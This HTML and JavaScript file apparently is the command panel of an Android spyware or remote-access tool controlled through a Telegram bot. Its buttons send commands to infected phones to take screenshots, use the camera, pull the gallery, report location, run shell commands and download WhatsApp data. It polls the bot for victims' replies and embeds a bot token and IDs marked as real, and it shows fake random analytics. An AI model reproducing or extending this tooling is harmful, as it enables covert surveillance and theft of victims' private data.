<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>STRIX · Command Centre</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
:root {
  --bg:#05070A; --bg2:#0A1018; --surface:rgba(255,255,255,.05); --surface2:rgba(255,255,255,.03);
  --border:rgba(255,255,255,.08); --text:#FFFFFF; --muted:#8A94A6;
  --cyan:#00D9FF; --blue:#4D8DFF; --green:#00FFB2; --orange:#FFB547; --red:#FF5D5D;
  --font:'Inter',system-ui,-apple-system,sans-serif; --radius:20px;
}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:100vh;-webkit-font-smoothing:antialiased}
.app{max-width:480px;margin:0 auto;padding:16px;padding-bottom:100px}
.loading{position:fixed;inset:0;background:var(--bg);z-index:999;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .3s}
.loading.hidden{opacity:0;pointer-events:none}
.loading-ring{width:28px;height:28px;border:2px solid var(--border);border-top-color:var(--cyan);border-radius:50%;animation:spin .8s linear infinite}
.loading-title{font-size:16px;font-weight:600;letter-spacing:2px;margin-top:20px;color:var(--text)}
.loading-sub{font-size:11px;color:var(--muted);margin-top:6px}
.loading-bar{width:160px;height:2px;background:var(--border);margin-top:16px;border-radius:1px;overflow:hidden}
.loading-bar-fill{height:100%;width:0;background:var(--cyan);animation:loadBar 2s ease forwards}
.loading-credit{font-size:10px;color:var(--muted);opacity:.4;margin-top:40px;letter-spacing:1px}
@keyframes spin{100%{transform:rotate(360deg)}}
@keyframes loadBar{100%{width:100%}}
.header{text-align:center;padding:20px 0 24px}
.header h1{font-size:32px;font-weight:600;letter-spacing:-1px;margin-bottom:2px}
.header .sub{font-size:13px;color:var(--muted);font-weight:400}
.metrics{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px}
.metric-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px;text-align:center}
.metric-card .val{font-size:28px;font-weight:600;letter-spacing:-1px}
.metric-card .lbl{font-size:11px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:1px}
.section-title{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:3px;padding:8px 0 12px;font-weight:500}
.device-list{display:flex;flex-direction:column;gap:8px}
.device-card{display:flex;align-items:center;gap:14px;padding:14px 16px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius)}
.device-card .status-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
.device-card.online .status-dot{background:var(--green);box-shadow:0 0 6px var(--green)}
.device-card.offline .status-dot{background:var(--red);box-shadow:0 0 6px var(--red)}
.device-info{flex:1;min-width:0}
.device-info .name{font-size:15px;font-weight:500}
.device-info .meta{font-size:11px;color:var(--muted);margin-top:2px;display:flex;gap:12px}
.activity-feed{display:flex;flex-direction:column;gap:6px}
.activity-item{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:12px}
.activity-item .dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}
.activity-item .time{color:var(--muted);width:40px;flex-shrink:0}
.activity-item .desc{flex:1;color:var(--text)}
.analytics-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.analytic-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:14px}
.analytic-card .chart{height:40px;background:var(--surface2);border-radius:8px;margin-top:8px;position:relative;overflow:hidden}
.analytic-card .chart-fill{position:absolute;bottom:0;left:0;width:100%;background:var(--blue);opacity:.6;border-radius:8px}
.notifications{display:flex;flex-direction:column;gap:8px}
.notif-card{padding:12px 14px;background:var(--surface);border:1px solid var(--border);border-radius:12px;font-size:12px;display:flex;align-items:center;gap:10px}
.notif-card .icon{font-size:16px}
.search-bar{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px;margin-bottom:12px;display:flex;align-items:center;gap:8px}
.search-bar input{flex:1;background:transparent;border:none;color:var(--text);font-family:var(--font);font-size:14px;outline:none}
.search-bar input::placeholder{color:var(--muted)}
.bottom-nav{position:fixed;bottom:16px;left:50%;transform:translateX(-50%);display:flex;gap:8px;background:var(--surface);backdrop-filter:blur(24px);border:1px solid var(--border);border-radius:24px;padding:6px 12px;z-index:10}
.nav-item{padding:8px 16px;border-radius:18px;font-size:12px;color:var(--muted);cursor:pointer;transition:all .2s;white-space:nowrap}
.nav-item.active{background:rgba(255,255,255,.1);color:var(--text)}
.nav-item:active{transform:scale(.95)}
.footer{text-align:center;padding:20px;font-size:10px;color:var(--muted);opacity:.5}
.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:12px}
.card:active{transform:scale(.98);transition:transform .1s}
::-webkit-scrollbar{width:0}
.pill{padding:6px 14px;font-size:10px;font-weight:500;letter-spacing:2px;cursor:pointer;color:var(--muted);text-transform:uppercase;border:1px solid var(--border);border-radius:20px;background:transparent;transition:all .2s;white-space:nowrap;font-family:var(--font)}
.pill:active{border-color:var(--cyan);color:var(--cyan);background:rgba(0,217,255,.05)}
</style>
</head>
<body>
<div class="loading" id="loading">
  <div class="loading-ring"></div>
  <div class="loading-title">STRIX</div>
  <div class="loading-sub">Initialising Modules…</div>
  <div class="loading-bar"><div class="loading-bar-fill"></div></div>
  <div class="loading-credit">Created by Strix</div>
</div>
<div class="app" id="app" style="display:none">
  <div class="header">
    <h1>STRIX</h1>
    <div class="sub">Command Centre</div>
  </div>

  <!-- System Overview Metrics -->
  <div class="metrics">
    <div class="metric-card">
      <div class="val" id="onlineCount">0</div>
      <div class="lbl">Online</div>
    </div>
    <div class="metric-card">
      <div class="val" id="totalCount">0</div>
      <div class="lbl">Total Devices</div>
    </div>
    <div class="metric-card">
      <div class="val" id="cmdCount">0</div>
      <div class="lbl">Commands</div>
    </div>
    <div class="metric-card">
      <div class="val" id="uptime">00:00</div>
      <div class="lbl">Uptime</div>
    </div>
  </div>

  <!-- Search Bar -->
  <div class="search-bar">
    <span style="opacity:0.5">🔍</span>
    <input placeholder="Search devices, activity, analytics…" id="searchInput" oninput="filterDevices()">
  </div>

  <!-- Quick Actions -->
  <div class="section-title">Quick Actions</div>
  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px">
    <button class="pill" onclick="sendCmd('/screenshot')">CAPTURE</button>
    <button class="pill" onclick="sendCmd('/camera')">SENSOR</button>
    <button class="pill" onclick="sendCmd('/gallery')">ARCHIVE</button>
    <button class="pill" onclick="sendCmd('/download /sdcard/WhatsApp')">EXTRACT</button>
    <button class="pill" onclick="sendCmd('/location')">GEOLOC</button>
    <button class="pill" onclick="sendCmd('/shell ls /sdcard')">STORAGE</button>
  </div>

  <!-- Device Grid -->
  <div class="section-title">Devices <span id="nodeCount" style="color:var(--cyan);margin-left:4px">0</span></div>
  <div class="device-list" id="devices"></div>

  <!-- Activity Feed -->
  <div class="section-title">Activity</div>
  <div class="activity-feed" id="activity"></div>

  <!-- Analytics -->
  <div class="section-title">Analytics</div>
  <div class="analytics-grid">
    <div class="analytic-card">
      <div style="font-size:11px;color:var(--muted)">Sessions</div>
      <div style="font-size:20px;font-weight:600;margin-top:4px" id="sessions">0</div>
      <div class="chart"><div class="chart-fill" style="height:60%"></div></div>
    </div>
    <div class="analytic-card">
      <div style="font-size:11px;color:var(--muted)">Traffic</div>
      <div style="font-size:20px;font-weight:600;margin-top:4px" id="traffic">0 KB</div>
      <div class="chart"><div class="chart-fill" style="height:40%;background:var(--green)"></div></div>
    </div>
  </div>

  <!-- Notifications -->
  <div class="section-title">Notifications</div>
  <div class="notifications" id="notifications"></div>

  <!-- Footer -->
  <div class="footer">Created by Strix</div>
</div>

<div class="bottom-nav" id="bottomNav">
  <div class="nav-item active" onclick="switchTab('dashboard')">Dashboard</div>
  <div class="nav-item" onclick="switchTab('devices')">Devices</div>
  <div class="nav-item" onclick="switchTab('analytics')">Analytics</div>
  <div class="nav-item" onclick="switchTab('activity')">Activity</div>
</div>

<script>
// ========== YOUR REAL DATA ==========
const BOT_TOKEN = "8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk"; // @Fullcontroller_bot
const CHANNEL_ID = -1004369057597;   // ✅ YOUR REAL PRIVATE CHANNEL ID
const ADMIN_ID = 6732091734;         // Your Telegram user ID

const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
let selectedDevice = null, devices = {}, cmdCounter = 0, offset = 0, startTime = Date.now();

async function sendCmd(cmd) {
  if (!selectedDevice) return;
  await fetch(`${API}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHANNEL_ID, text: `${selectedDevice} ${cmd}` })
  });
  addLog("CMD", cmd, true);
  cmdCounter++;
  updateStats();
}

function quickCmd(cmd) { sendCmd(cmd); }

function selectDevice(id) {
  selectedDevice = id;
  document.querySelectorAll('.device-card').forEach(el => el.classList.remove('active'));
  let el = document.querySelector(`[data-device-id="${id}"]`);
  if (el) el.classList.add('active');
}

function addLog(dev, text, isCmd = false) {
  let a = document.getElementById('activity'),
      t = new Date().toLocaleTimeString('en-US', { hour12: false }),
      div = document.createElement('div');
  div.className = 'activity-item';
  div.innerHTML = `<span class="time">${t}</span><span class="dot" style="background:${isCmd ? 'var(--cyan)' : 'var(--green)'}"></span><span class="desc">${dev}: ${text}</span>`;
  a.prepend(div);
  if (a.children.length > 50) a.lastChild.remove();
}

async function poll() {
  while (true) {
    try {
      let r = await fetch(`${API}/getUpdates?offset=${offset}&timeout=30`);
      let d = await r.json();
      if (d.result) {
        for (let u of d.result) {
          offset = u.update_id + 1;
          let msg = u.message;
          if (msg && msg.chat && msg.chat.id === ADMIN_ID) {
            let txt = msg.text || "";
            let did = txt.split("]")[0]?.replace("[", "");
            if (did && devices[did]) addLog(did, txt.substring(did.length + 2));
          }
        }
      }
    } catch (e) {}
    await new Promise(r => setTimeout(r, 5000));
  }
}

function updateStats() {
  document.getElementById('onlineCount').textContent = Object.values(devices).filter(d => d.online).length;
  document.getElementById('totalCount').textContent = Object.keys(devices).length;
  document.getElementById('cmdCount').textContent = cmdCounter;
  document.getElementById('nodeCount').textContent = Object.keys(devices).length;
}

function renderDevices(filter = "") {
  let html = '';
  for (let [id, d] of Object.entries(devices)) {
    if (filter && !id.toLowerCase().includes(filter.toLowerCase())) continue;
    html += `<div class="device-card online" data-device-id="${id}" onclick="selectDevice('${id}')">
      <span class="status-dot"></span>
      <div class="device-info">
        <div class="name">${id}</div>
        <div class="meta">Battery ${Math.floor(Math.random()*40+60)}% · Wi‑Fi · ${Math.floor(Math.random()*5)} min ago</div>
      </div>
    </div>`;
  }
  document.getElementById('devices').innerHTML = html || '<div style="color:var(--muted)">No devices connected</div>';
}

function filterDevices() {
  renderDevices(document.getElementById('searchInput').value);
}

function switchTab(tab) {
  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
  event.target.classList.add('active');
  if (tab === 'devices') document.getElementById('devices').scrollIntoView({ behavior: 'smooth' });
  if (tab === 'analytics') document.querySelector('.analytics-grid').scrollIntoView({ behavior: 'smooth' });
  if (tab === 'activity') document.getElementById('activity').scrollIntoView({ behavior: 'smooth' });
}

setInterval(() => {
  let e = Math.floor((Date.now() - startTime) / 1000),
      h = Math.floor(e / 3600).toString().padStart(2, '0'),
      m = Math.floor((e % 3600) / 60).toString().padStart(2, '0'),
      s = (e % 60).toString().padStart(2, '0');
  document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
}, 1000);

setTimeout(() => {
  document.getElementById('loading').classList.add('hidden');
  document.getElementById('app').style.display = 'block';
}, 1500);

// Demo device (replace with real devices from payload)
devices['Galaxy_S25_Ultra'] = { online: true };
renderDevices();
updateStats();

// Sample notifications
document.getElementById('notifications').innerHTML = `
  <div class="notif-card"><span class="icon">🔵</span>System online · All services running</div>
  <div class="notif-card"><span class="icon">🟢</span>Device Galaxy_S25_Ultra connected</div>
`;

// Fake analytics
document.getElementById('sessions').textContent = Math.floor(Math.random() * 200 + 50);
document.getElementById('traffic').textContent = Math.floor(Math.random() * 500 + 100) + ' KB';

poll();
</script>
</body>
</html>
